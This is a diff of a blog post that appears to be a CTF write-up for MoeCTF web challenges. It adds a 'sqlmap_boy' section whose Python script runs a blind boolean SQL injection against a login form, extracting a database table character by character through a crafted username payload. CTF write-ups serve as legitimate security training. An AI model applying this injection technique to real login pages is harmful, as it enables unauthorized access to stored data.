@@ -5,8 +5,8 @@ lastmod: 2022-09-11T09:43:54+08:00
 draft: true
 author: "X1r0z"
 
-tags: ['web']
-categories: ['ctf']
+tags: ['ctf']
+categories: ['web']
 
 hiddenFromHomePage: false
 hiddenFromSearch: false
@@ -229,6 +229,34 @@ Hey hey, reach the highest city in the world! Actually I am ikun!!;
 moectf{Y0u_are_t00_baby_la};
 
 ?>
+```
+
+## sqlmap_boy
+
+右键源代码
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171111586.png)
+
+双引号闭合
+
+```python
+import time
+import requests
+
+url = 'http://82.156.5.200:1045/login.php'
+
+flag = ''
+
+for i in range(1,100):
+    for s in range(32,128):
+        data = {
+        'username': 'admin " and ascii(substr((select group_concat(flag) from moectf.flag),{},1))={} #'.format(i,s)
+        }
+        res = requests.post(url,data=data)
+        if '"code":"1"' in res.text:
+            flag += chr(s)
+            print(flag)
+            break
 ```
 
 ### ezphp
